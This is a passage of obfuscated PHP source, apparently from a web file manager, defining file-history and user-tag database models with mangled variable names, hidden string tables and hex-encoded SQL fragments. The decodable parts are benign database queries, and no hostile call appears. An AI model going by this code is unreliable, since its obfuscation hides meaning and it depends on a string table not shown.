²†”¡[12], $ç ²†”¡[511]); $©¿ÀÚ = array_slice($©¿ÀÚ, $É‚±Ú’); if (!$…°©„ÜÓ || !$©¿ÀÚ) { return; } $Ã£Å»®Ñ = array($ç ²†”¡[463] => array($ç ²†”¡[7], $…°©„ÜÓ)); $this->where($Ã£Å»®Ñ)->delete(); Model($ç ²†”¡[514])->remove($©¿ÀÚ); } public function listData($¾¡ ğ·ı) { $è®ğ·¡ =& $_SERVER[ò«¥Ê‡å]; $¯ëÓƒ± = array($è®ğ·¡[461] => $¾¡ ğ·ı); $ÇšÙÔ¤ı = $è®ğ·¡[2148]; $€¾îÖõƒ = $this->field($ÇšÙÔ¤ı)->where($¯ëÓƒ±)->order($è®ğ·¡[2141])->selectPage(); $this->_listAppendUser($€¾îÖõƒ[$è®ğ·¡[415]]); $¸«‡ ¡ = Model($è®ğ·¡[809])->get($è®ğ·¡[1286]); $§•ëÖÓª = 5; if ($¸«‡ ¡ == $è®ğ·¡[1287]) { $€¾îÖõƒ[$è®ğ·¡[415]] = array_slice($€¾îÖõƒ[$è®ğ·¡[415]], 0, $§•ëÖÓª); $€¾îÖõƒ[$è®ğ·¡[412]] = array($è®ğ·¡[2149] => 1, $è®ğ·¡[2150] => 20, $è®ğ·¡[2151] => 1, $è®ğ·¡[2152] => count($€¾îÖõƒ[$è®ğ·¡[415]])); } return $€¾îÖõƒ; } protected function _listAppendUser(&$è£ù½İ) { $âÒ‚İ·è =& $_SERVER[ò«¥Ê‡å]; $‹Û¦•œ = array_to_keyvalue($è£ù½İ, $âÒ‚İ·è[12], $âÒ‚İ·è[1701]); $úæ‚âÍ¾ = Model($âÒ‚İ·è[569])->userListInfo($‹Û¦•œ); foreach ($è£ù½İ as &$‡ÀşùØà) { $é‰à­“î = $‡ÀşùØà[$âÒ‚İ·è[1701]]; $‡ÀşùØà[$âÒ‚İ·è[497]] = $úæ‚âÍ¾[$é‰à­“î] ? $úæ‚âÍ¾[$é‰à­“î] : !1; } unset($‡ÀşùØà); } public function fileInfo($Ìâ´¦İµ) { $œùÇ—àÕ =& $_SERVER[ò«¥Ê‡å]; $“³€¼– = $this->tablePrefix; $èºÁÆÓå = "{$“³€¼–}\x69\x6f\137\x66\x69\x6c\145\40\x66\x69\x6c\x65\x73\40\x6f\156\40\146\x69\x6c\x65\163\56\x66\151\x6c\x65\x49\x44\40\x3d\40\150\151\163\164\157\162\x79\56\x66\x69\x6c\145\x49\104"; return $this->alias($œùÇ—àÕ[2153])->where(array($œùÇ—àÕ[463] => $Ìâ´¦İµ))->join($èºÁÆÓå, $œùÇ—àÕ[2154])->find(); } public function removeItem($ÖÄÕµ«ú) { $áïè®í¨ =& $_SERVER[ò«¥Ê‡å]; $“úÌ¦æ· = array($áïè®í¨[463] => $ÖÄÕµ«ú); $ğÅ¦öÇ = $this->where($“úÌ¦æ·)->find(); if ($ğÅ¦öÇ) { $§¸óé = $this->where($“úÌ¦æ·)->delete(); Model($áïè®í¨[514])->remove($ğÅ¦öÇ[$áïè®í¨[511]]); return $§¸óé; } return !1; } public function removeBySource($âÚ§ÙÖ“) { $£Ößõ‡Í =& $_SERVER[ò«¥Ê‡å]; if (!$âÚ§ÙÖ“) { return !1; } if (!is_array($âÚ§ÙÖ“)) { $âÚ§ÙÖ“ = array($âÚ§ÙÖ“); } $ØôªÊ£İ = array($£Ößõ‡Í[461] => array($£Ößõ‡Í[7], $âÚ§ÙÖ“)); $âò´Ü“‹ = $this->field($£Ößõ‡Í[512])->where($ØôªÊ£İ)->select(); if ($âò´Ü“‹) { $this->where($ØôªÊ£İ)->delete(); $¿ÏÂêìı = array_to_keyvalue($âò´Ü“‹, $£Ößõ‡Í[12], $£Ößõ‡Í[511]); Model($£Ößõ‡Í[514])->remove($¿ÏÂêìı); } return !0; } public function setDetail($÷°ÌØå´, $Ö¯£ºŞ) { $®˜ŸŠó¢ =& $_SERVER[ò«¥Ê‡å]; return $this->where(array($®˜ŸŠó¢[463] => $÷°ÌØå´))->save(array($®˜ŸŠó¢[2144] => $Ö¯£ºŞ)); } public function rollbackToItem($õ§†î„Â, $öÁÅ‘¸Î) { $º¾§²´† =& $_SERVER[ò«¥Ê‡å]; $ú•‚ìî = Model($º¾§²´†[871])->sourceInfo($õ§†î„Â); $this->addHistory($ú•‚ìî, LNG($º¾§²´†[2155])); $ì—ó¼¤« = $this->find($öÁÅ‘¸Î); $‹…âÖŠ = array($º¾§²´†[511] => $ì—ó¼¤«[$º¾§²´†[511]], $º¾§²´†[78] => $ì—ó¼¤«[$º¾§²´†[78]], $º¾§²´†[87] => time(), $º¾§²´†[499] => USER_ID); Model($º¾§²´†[871])->where(array($º¾§²´†[183] => $õ§†î„Â))->save($‹…âÖŠ); return $this->where(array($º¾§²´†[463] => $öÁÅ‘¸Î))->delete(); } public function clearSame($ëŠÂÛØÌ) { $×Î›Ûñâ =& $_SERVER[ò«¥Ê‡å]; $ÊÅø¿Š = $this->listData($ëŠÂÛØÌ); $È™¿û‰ = array_to_keyvalue_group($ÊÅø¿Š, $×Î›Ûñâ[511]); $•ùÓºÚ« = array(); $€¦§­€¨ = array(); foreach ($È™¿û‰ as $ª³î¨…Ş) { if (!$ª³î¨…Ş || count($ª³î¨…Ş) <= 1) { continue; } foreach ($ª³î¨…Ş as $Ú×¥èï) { $•ùÓºÚ«[] = $Ú×¥èï[$×Î›Ûñâ[511]]; $€¦§­€¨[] = $Ú×¥èï[$×Î›Ûñâ[445]]; } } if (!$€¦§­€¨) { return; } $this->where(array($×Î›Ûñâ[445] => array($×Î›Ûñâ[7], $€¦§­€¨)))->delete(); Model($×Î›Ûñâ[514])->remove($•ùÓºÚ«); } public function userSpace() { $òÔöàé¯ =& $_SERVER[ò«¥Ê‡å]; $Ñ£Ÿƒƒ = $this->tablePrefix; $İÇëÆºÖ = array($òÔöàé¯[1692] => USER_ID); $ÇøØüÎ¶ = "{$Ñ£Ÿƒƒ}\151\x6f\x5f\146\x69\154\x65\40\146\x69\154\x65\x73\40\157\x6e\40\x66\151\154\145\163\x2e\x66\x69\x6c\x65\x49\x44\x20\x3d\x20\x68\x69\x73\x74\x6f\x72\x79\56\146\x69\154\145\111\x44"; return $this->alias($òÔöàé¯[2153])->where($İÇëÆºÖ)->join($ÇøØüÎ¶, $òÔöàé¯[2154])->sum($òÔöàé¯[78]); } } goto dÈô×¡•; aÊèŞ¾¸×æ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\146\x61\166"; protected function cacheFunctionAlias($’ºÓŞëÏ) { $†£á¯¼ô =& $_SERVER[ò«¥Ê‡å]; return array($†£á¯¼ô[2010] => array($†£á¯¼ô[2401] . USER_ID, $†£á¯¼ô[2011])); } protected function listData() { $åÂÛšÍ =& $_SERVER[ò«¥Ê‡å]; $ï–ÎœÂî = array($åÂÛšÍ[1692] => USER_ID, $åÂÛšÍ[528] => array($åÂÛšÍ[2014], 0)); $»‹Ò‘û = $åÂÛšÍ[2402]; $öÀèÌåú = $this->field($»‹Ò‘û)->where($ï–ÎœÂî)->order($åÂÛšÍ[2017])->select(); return $öÀèÌåú ? $öÀèÌåú : array(); } protected function addToTag($÷‚¿‰ã±, $—ÂÊÑÙ) { $á‡ºº¹€ =& $_SERVER[ò«¥Ê‡å]; if (!Model($á‡ºº¹€[2160])->listData($—ÂÊÑÙ)) { return !1; } if (is_numeric($÷‚¿‰ã±)) { $—°ë¶Ö = Model($á‡ºº¹€[871])->pathInfo($÷‚¿‰ã±); if (!$—°ë¶Ö) { return !1; } } else { $—°ë¶Ö = IO::infoSimple($÷‚¿‰ã±); if (!$—°ë¶Ö) { return !1; } $È§ìÔ¸Ê = $—°ë¶Ö[$á‡ºº¹€[32]]; $¸§¥Š¹å = $—°ë¶Ö[$á‡ºº¹€[33]]; if (isset($—°ë¶Ö[$á‡ºº¹€[455]])) { $¸§¥Š¹å = $—°ë¶Ö[$á‡ºº¹€[455]] == $á‡ºº¹€[90] ? $á‡ºº¹€[77] : $á‡ºº¹€[216]; } } $Ù§÷ºú½ = array($á‡ºº¹€[1692] => USER_ID, $á‡ºº¹€[528] => $—ÂÊÑÙ, $á‡ºº¹€[465] => $÷‚¿‰ã±, $á‡ºº¹€[466] => $¸§¥Š¹å ? $¸§¥Š¹å : $á‡ºº¹€[460], $á‡ºº¹€[464] => $È§ìÔ¸Ê ? $È§ìÔ¸Ê : $á‡ºº¹€[12], $á‡ºº¹€[1903] => 0); if ($this->where($Ù§÷ºú½)->find()) { return !1; } return $this->add($Ù§÷ºú½); } protected function removeFromTag($é¢¬–à, $„Ğ«·›) { $¾¡ÕÈ‚é =& $_SERVER[ò«¥Ê‡å]; if (!Model($¾¡ÕÈ‚é[2160])->listData($„Ğ«·›)) { return !1; } if (is_array($é¢¬–à)) { $é¢¬–à = array($¾¡ÕÈ‚é[7], $é¢¬–à); } $ÉÅîÁ÷± = array($¾¡ÕÈ‚é[1692] => USER_ID, $¾¡ÕÈ‚é[528] => $„Ğ«·›, $¾¡ÕÈ‚é[465] => $é¢¬–à); return $this->where($ÉÅîÁ÷±)->delete(); } protected function removeByTag($Ìûõ©í‘) { $ÍÇË£³ =& $_SERVER[ò«¥Ê‡å]; if (!$Ìûõ©í‘) { return !1; } $íšè÷ïÎ = array($ÍÇË£³[1692] => USER_ID, $ÍÇË£³[528] => $Ìûõ©í‘); return $this->where($íšè÷ïÎ)->delete(); } protected function removeBySource($á¿ô¶è) { $–¾¼¢Ëç =& $_SERVER[ò«¥Ê‡å]; if (is_array($á¿ô¶è)) { $á¿ô¶è = array($–¾¼¢Ëç[7], $á¿ô¶è); } $õàµ²é = array($–¾¼¢Ëç[1692] => USER_ID, $–¾¼¢Ëç[528] => array($–¾¼¢Ëç[1061], 0), $–¾¼¢Ëç[465] => $á¿ô¶è); return $this->where($õàµ²é)->delete(); } }